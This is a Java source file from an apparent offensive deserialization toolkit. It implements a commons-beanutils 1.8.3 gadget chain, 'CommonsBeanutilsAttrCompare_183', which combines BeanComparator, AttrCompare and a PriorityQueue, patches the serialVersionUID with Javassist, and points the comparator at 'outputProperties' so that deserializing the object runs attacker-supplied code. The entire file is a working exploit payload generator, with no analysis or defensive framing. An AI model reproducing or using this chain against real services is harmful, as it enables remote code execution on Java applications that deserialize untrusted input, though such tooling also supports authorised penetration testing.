package com.summersec.attack.deser.payloads;

import com.summersec.attack.deser.payloads.annotation.Authors;
import com.summersec.attack.deser.payloads.annotation.Dependencies;
import com.summersec.attack.deser.util.JavassistClassLoader;
import com.summersec.attack.deser.util.Reflections;


import com.summersec.attack.deser.util.StandardExecutorClassLoader;
import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.commons.beanutils.BeanComparator;

import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;


@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
@Authors({"SummerSec"})
public class CommonsBeanutilsAttrCompare_183 implements ObjectPayload<Queue<Object>>{

    @Override
    public Queue<Object> getObject(Object template) throws Exception {

        AttrNSImpl attrNS1 = new AttrNSImpl();
        CoreDocumentImpl coreDocument = new CoreDocumentImpl();
        attrNS1.setValues(coreDocument,"1","1","1");

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        }catch (javassist.NotFoundException e){}
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
        final Comparator beanComparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
        ctBeanComparator.defrost();
        Reflections.setFieldValue(beanComparator, "comparator", new AttrCompare());

//        StandardExecutorClassLoader classLoader = new StandardExecutorClassLoader("1.9.2");
//        Class u = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
//        System.out.println(u.getPackage());


//        Object beanComparator = u.getDeclaredConstructor(String.class, Comparator.class).newInstance(null, new AttrCompare());

//        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, (Comparator<?>) beanComparator);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, (Comparator<? super Object>) beanComparator);


        queue.add(attrNS1);
        queue.add(attrNS1);


        Reflections.setFieldValue(queue, "queue", new Object[] { template, template });

        Reflections.setFieldValue(beanComparator, "property", "outputProperties");
//        Reflections.setFieldValue(beanComparator, "comparator",  new AttrNSImpl());

        return (Queue)queue;
    }
}
